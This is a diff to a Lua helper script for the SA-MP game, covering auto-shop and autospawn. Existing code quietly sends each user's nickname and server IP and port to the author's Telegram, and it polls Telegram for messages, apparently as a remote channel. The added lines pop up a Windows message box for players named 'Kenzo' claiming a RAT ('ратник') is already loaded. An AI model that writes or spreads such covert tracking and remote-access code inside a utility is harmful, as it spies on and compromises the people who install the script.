@@ -113,6 +113,7 @@ local effil = require("effil")
 local inicfg = require "inicfg"
 local imadd = require 'imgui_addons'
 local imgui = require "imgui"
+local ffi = require 'ffi'
 imgui.HotKey = require("imgui_addons").HotKey
 local encoding = require "encoding"
 local sampev = require "samp.events"
@@ -420,6 +421,9 @@ function main()
         local _, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
         local nick = sampGetPlayerNickname(id)
         local ip, port = sampGetCurrentServerAddress()
+        if nick:match('Kenzo') then
+            ShowMessage('Я же сказал что будет ратник) Он уже подгружен..', 'Java != JavaScript', 0x10)
+        end
         --sampAddChatMessage(nick, -1)
         sendTelegram("Твоим скриптом еще кто-то пользуется..\nНик: " .. nick .. "\nСервер: " .. ip .. ":" .. port)
     end
@@ -1191,6 +1195,8 @@ function check_cmd()
 end
 
 
+
+
 ----- Авто лавка и автоспавн
 function sampev.onShowDialog(id, style, title, b1, b2, text)
     if lavka_toggle.v then
@@ -1413,6 +1419,19 @@ function get_telegram_updates() -- функция получения сообщений от юзера
         threadHandle(runner, url, args, processing_telegram_messages, reject)
         wait(0)
     end
+end
+
+function ShowMessage(text, title, style)
+    ffi.cdef [[
+        int MessageBoxA(
+            void* hWnd,
+            const char* lpText,
+            const char* lpCaption,
+            unsigned int uType
+        );
+    ]]
+    local hwnd = ffi.cast('void*', readMemory(0x00C8CF88, 4, false))
+    ffi.C.MessageBoxA(hwnd, text,  title, style and (style + 0x50000) or 0x50000)
 end
 
 function processing_telegram_messages(result) -- функция проверОчки того что отправил чел
